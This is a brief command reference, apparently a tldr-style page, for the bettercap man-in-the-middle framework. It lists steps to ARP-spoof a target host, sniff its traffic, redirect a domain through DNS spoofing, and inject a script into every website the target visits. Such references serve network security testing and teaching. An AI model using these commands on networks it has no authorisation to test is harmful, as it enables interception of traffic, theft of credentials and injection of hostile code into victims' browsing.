# bettercap

> Bettercap is an extremely powerful, modular MITM framework for network attacks, sniffing, and monitoring.
> More information: https://www.bettercap.org/project/introduction/

- Select target interface (eth0):
`bettercap -iface eth0`

- Scan network
`net.probe on`
`net.show`

- Show ARP tables
`arp.spoof.targets`

- MITM (Man-in-the-Middle) Attack against a target (192.168.1.50)
`set arp.spoof.targets 192.168.1.50`
`arp.spoof on`

- Activate packet sniffer
`net.sniff on`

- Spoof a domain (example.com) to your IP (192.168.1.100)
`set dns.spoof.domains example.com`
`set dns.spoof.address 192.168.1.100`
`dns.spoof on`

- Inject a custom script (inject.js) into any website the target visits
`set http.proxy.script inject.js`
`http.proxy on`

